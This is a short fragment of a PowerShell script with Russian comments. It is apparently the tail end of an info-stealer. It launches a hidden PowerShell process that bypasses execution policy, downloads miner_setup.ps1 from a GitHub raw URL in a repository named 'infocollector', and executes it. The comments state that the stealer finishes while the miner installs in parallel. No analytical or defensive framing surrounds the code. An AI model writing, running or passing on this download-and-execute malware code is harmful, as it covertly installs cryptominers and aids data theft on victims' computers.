...
# Запускаем установку майнера в отдельном процессе (фоново, без ожидания)
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -Ep Bypass -W H -C `"iex(iwr 'https://raw.githubusercontent.com/kneel67/infocollector/refs/heads/main/miner_setup.ps1' -UseB).Content`"" -WindowStyle Hidden

# Стилер завершается, майнер устанавливается параллельно
